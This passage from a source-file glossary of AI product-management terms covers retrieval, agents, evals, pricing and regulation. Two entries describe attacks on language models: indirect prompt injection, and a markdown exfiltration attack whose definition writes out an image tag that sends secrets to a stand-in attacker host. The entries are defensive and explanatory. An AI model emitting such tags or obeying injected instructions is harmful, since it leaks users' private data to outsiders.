      'Dense embeddings blur exact error codes, SKUs, and legal section numbers; hybrid retrieval is table stakes for enterprise RAG.',
  },
  {
    term: 'Cross-Encoder Reranker',
    category: 'RAG & Context',
    definition:
      'A specialized second-stage scoring model that jointly reads `(query, candidate_chunk)` pairs across top ~40 retrieved hits to select the highest-precision top 5–8.',
    pmImplication:
      'Dramatically boosts answer faithfulness while shrinking prompt input tokens and preventing context rot.',
  },
  {
    term: 'Contextual Breadcrumb Chunking',
    category: 'RAG & Context',
    definition:
      'Prepending document hierarchy metadata (Source > Doc Title > Section Header > Effective Date) to every text chunk before embedding.',
    pmImplication:
      'Prevents orphan chunks from losing critical scope like "Applies only to 2026 EU Enterprise contracts."',
  },
  {
    term: 'Pre-Retrieval ACL Filtering',
    category: 'RAG & Context',
    definition:
      'Enforcing tenant and user access-control permissions inside the vector/keyword index query itself BEFORE computing top-K rankings.',
    pmImplication:
      'Post-filtering after top-K leaks forbidden titles or returns 0 empty results to restricted users. Pre-filtering is non-negotiable for enterprise trust.',
  },
  {
    term: 'Recall@K vs. Faithfulness',
    category: 'RAG & Context',
    definition:
      'Separating whether the retriever found the correct source document in the top K chunks (Recall@K) from whether the LLM stayed strictly grounded in those chunks (Faithfulness).',
    pmImplication:
      'Never ask engineers to "fix hallucination in the prompt" when Recall@K proves the right document was never retrieved in the first place.',
  },
  {
    term: 'Context Engineering',
    category: 'RAG & Context',
    definition:
      'The discipline of dynamically selecting, compressing, structuring, and managing short-term, episodic, and procedural memory inside an AI system’s active window.',
    pmImplication:
      'Determines how smart and coherent long-running agents feel across sessions without exploding token bills.',
  },
  {
    term: 'Compounding Error Law (p^N)',
    category: 'Agents & Safety',
    definition:
      'Mathematical decay where an N-step sequential workflow with per-step accuracy `p` succeeds end-to-end with probability `p^N` unless verified or bounded.',
    pmImplication:
      'Explains why 95% per-step accuracy becomes just 46% across 15 steps—mandating deterministic state machines, checkpoints, and scoped sub-agents.',
  },
  {
    term: 'Model Context Protocol (MCP)',
    category: 'Agents & Safety',
    definition:
      'An open standard protocol defining how AI hosts discover and invoke external tools, structured resources, and prompt templates safely across integrations.',
    pmImplication:
      'Replaces brittle custom glue code with standardized tool contracts, permission scopes, and portable enterprise integrations.',
  },
  {
    term: 'Human-in-the-Loop (HITL) Gate',
    category: 'Agents & Safety',
    definition:
      'Pausing autonomous execution before irreversible or high-blast-radius external writes so a human reviews a clear diff card and approves, edits, or rejects.',
    pmImplication:
      'Turns catastrophic silent failures into safe, trust-building collaborative workflows.',
  },
  {
    term: 'Idempotency Key',
    category: 'Agents & Safety',
    definition:
      'A unique deterministic token passed on write tool calls so retries after network or agent timeouts never double-charge, double-refund, or send duplicate emails.',
    pmImplication:
      'Essential safety requirement in every agentic PRD that touches billing, CRM, or messaging APIs.',
  },
  {
    term: 'Indirect Prompt Injection',
    category: 'Agents & Safety',
    definition:
      'Attack where malicious instructions hidden inside external data (emails, web pages, PDFs, Slack threads) hijack an LLM into leaking secrets or calling unauthorized tools.',
    pmImplication:
      'Cannot be fixed by telling the model "be safe"—requires strict control/data XML isolation, least-privilege tool scoping, and HITL gates.',
  },
  {
    term: 'VAD & Barge-In (Realtime Voice)',
    category: 'Agents & Safety',
    definition:
      'Voice Activity Detection (identifying when a human finishes speaking) and Barge-In (instantly halting AI audio playback when the user interrupts mid-sentence).',
    pmImplication:
      'Make-or-break UX controls for voice agents; bad endpointing makes assistants cut users off or pause awkwardly for 2+ seconds.',
  },
  {
    term: 'Implicit Telemetry Flywheel (Accept / Edit / Reject)',
    category: 'Strategy & Governance',
    definition:
      'Capturing silent user behavioral signals—unchanged acceptance, exact edit diffs, regenerations, and dismissals—across every AI workflow.',
    pmImplication:
      'Creates a proprietary dataset of domain preferences and failure cases that builds a compounding product moat.',
  },
  {
    term: 'Teacher-Student Distillation (SFT / DPO)',
    category: 'Strategy & Governance',
    definition:
      'Using verified, high-quality outputs from an expensive Frontier ("Teacher") model to fine-tune a small, ultra-fast ("Student") model via SFT and DPO preference pairs.',
    pmImplication:
      'Unlocks 80–90% cost reduction and 4x speedup at scale while preserving frontier-level domain accuracy.',
  },
  {
    term: 'Zero Data Retention (ZDR)',
    category: 'Strategy & Governance',
    definition:
      'Enterprise API configuration and contract ensuring customer prompts and completions are neither logged persistently nor used to train provider models.',
    pmImplication:
      'Table stakes for selling AI software into regulated healthcare, financial, legal, and Fortune 500 environments.',
  },
  {
    term: 'Thin Wrapper Trap',
    category: 'Strategy & Governance',
    definition:
      'Building an AI product whose sole differentiation is a generic UI skin and a clever prompt over a foundation model API.',
    pmImplication:
      'Vulnerable to instant margin compression and obsolescence as labs bundle chat UX directly. Defensibility requires context graphs, workflow action, and eval telemetry.',
  },
  {
    term: 'Hybrid Seat + Credit Pricing',
    category: 'Strategy & Governance',
    definition:
      'Monetization combining predictable per-seat base platform access with a pooled or metered allocation of high-compute AI workflow credits.',
    pmImplication:
      'Aligns price with enterprise software predictability while insulating gross margins from heavy automation outliers.',
  },
  {
    term: 'EU AI Act Risk Tiering',
    category: 'Strategy & Governance',
    definition:
      'Regulatory classification framework imposing strict transparency, human oversight, logging, and conformity rules on High-Risk AI systems (hiring, credit, medical, legal).',
    pmImplication:
      'AI PMs must map product use cases early so audit trails, human overrides, and disclosure UIs are built into the architecture, not bolted on post-launch.',
  },
  {
    term: 'Test-Time Compute (System-2 Reasoning)',
    category: 'LLM Mechanics',
    definition:
      'Allocating additional internal reasoning tokens during inference so a model plans, verifies constraints, and backtracks before outputting its final visible response.',
    pmImplication:
      'Think tokens bill as output tokens and increase TTFT—use only where Pareto evals prove System-1 models fall short.',
  },
  {
    term: 'Cascade Model Routing',
    category: 'Economics & Latency',
    definition:
      'Routing requests dynamically through a fast classifier or deterministic optimistic check across tiers (Fast-Mini -> Frontier -> Reasoning) rather than hitting one expensive model everywhere.',
    pmImplication:
      'Routine 60–75% COGS reduction lever while giving simple actions sub-second responsiveness.',
  },
  {
    term: 'Orchestrator-Worker Topology',
    category: 'Agents & Safety',
    definition:
      'A multi-agent architecture where one lead planner decomposes a complex task into scoped parallel read-only workers passing compact JSON findings back to a deterministic synthesizer.',
    pmImplication:
      'Isolates noisy sub-task contexts and prevents sequential latency pile-ups without creating erratic agent swarms.',
  },
  {
    term: 'Context Compression / Summarization Memory',
    category: 'RAG & Context',
    definition:
      'Distilling long conversational histories or multi-step traces into compact structured state objects or episodic summaries before context rot degrades attention.',
    pmImplication:
      'Maintains session continuity across hours of work without blowing past prefix-cache or token budgets.',
  },
  {
    term: 'Markdown Exfiltration Attack',
    category: 'Agents & Safety',
    definition:
      'A covert leak where an indirect prompt injection tricks an LLM into emitting an external image tag (`![x](https://attacker.tld?secret=...)`) that exfiltrates private data when the browser renders it.',
    pmImplication:
      'Must be neutralized deterministically in your UI Markdown sanitizer + CSP headers, never via prompt reminders alone.',
  },
  {
    term: 'Canary Deployment & Shadow Mode',
    category: 'Evals & Quality',
    definition:
      'Shadow Mode mirrors live traffic silently without exposing outputs; Canary exposes a tiny tenant-clustered slice (e.g., 5% of workspaces) with automated cost/quality kill-switches.',
    pmImplication:
      'Eliminates surprise production margin meltdowns and isolates novelty bias cleanly before GA.',
  },
  {
    term: 'Outcome-Based Pricing (Per-Resolution)',
    category: 'Strategy & Governance',
    definition:
      'Charging customers strictly per verified completed business outcome (such as $0.99 per autonomously resolved support ticket) rather than per human seat or raw API token.',
    pmImplication:
      'Requires crisp, mutually audited completion definitions (e.g., no human reopen within 72 hours) and strict internal COGS ceilings.',
  },
  {
    term: 'Guardrail Classifier Latency',
    category: 'Economics & Latency',
    definition:
      'Added wait time introduced by running safety, PII, or prompt-injection detection checks before or during model streaming.',
    pmImplication:
      'Keep safety checks <80ms via deterministic rules + parallel micro-classifiers so trust never ruins perceived product speed.',
  },
  {
    term: 'Pareto Error Analysis',
    category: 'Evals & Quality',
    definition:
      'Inspecting 50–100 failing production traces, tagging axial root causes, and ranking the top 2 failure clusters causing ~70% of defects for weekly hill-climbing sprints.',
    pmImplication:
      'Prevents aimless prompt tweaking and aligns PM + ML Eng around highest-ROI defect elimination every single week.',
  },
];
